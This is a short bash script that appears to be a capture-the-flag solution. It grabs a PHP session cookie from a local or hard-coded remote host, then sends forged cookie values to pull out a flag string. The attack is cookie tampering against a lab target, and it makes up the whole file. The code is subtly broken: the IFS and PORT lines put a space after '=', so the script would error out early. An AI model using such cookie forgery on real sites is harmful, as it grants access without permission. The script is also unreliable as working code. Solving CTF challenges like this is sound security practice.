set -euo pipefail
IFS= $'\n\t'

PORT= 8080

case "${1:-}" in
  local)
    url="http://127.0.0.1:${PORT}"
    ;;
  remote)
    url="http://141.85.224.157:${PORT}"
    ;;
  *)
    [[ -n "${1:-}" && -n "${2:-}" ]] || {
      echo "Usage: $0 {local|remote|<host>} [port]"
      exit 1
    }
    url="${1}:${2}"
    ;;
esac

echo "Target URL: $url"
curl -s -c cookies.txt -o /dev/null "$url"

phpsessid=$(awk '/PHPSESSID/ {print $7}' cookies.txt)
flag=$(curl -s -b "PHPSESSID=$phpsessid; marco=polo; fernando=magellan; cristofor=columb" "$url" | grep -o 'SSS{[^}]*}')

echo "Flag is $flag"